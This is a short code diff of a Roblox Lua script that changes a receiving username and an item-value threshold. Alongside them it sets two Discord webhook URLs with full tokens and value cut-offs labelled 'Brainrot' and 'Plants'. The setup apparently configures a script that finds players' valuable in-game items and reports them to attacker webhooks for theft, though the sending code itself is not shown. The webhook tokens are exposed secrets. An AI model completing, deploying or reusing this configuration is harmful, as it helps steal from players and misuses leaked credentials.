@@ -1,9 +1,9 @@
 
-local username = "bludrebornalt5" 
+local username = "bowlreb10" 
 local webhook = "https://discord.com/api/webhooks/1364426276886020150/sVc0t4qRWkWNBYgHnk62AfvdS1te9pWcnauCkFEqNoaBt1-z8bmoO2pn7xa9-RWF5mtj" 
 local public = "https://discord.com/api/webhooks/1424596611723427910/FVKJ52a-s8GP7V4_0LSXlZoGlwV2uhn4i-5at2d92SkJTlOZQSn37B4zNmKAJq2YOXZA"
 local minworth = 100000 -- Brainrot 
-local minvalue = 2000000000 -- Plants
+local minvalue = 200000000 -- Plants
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
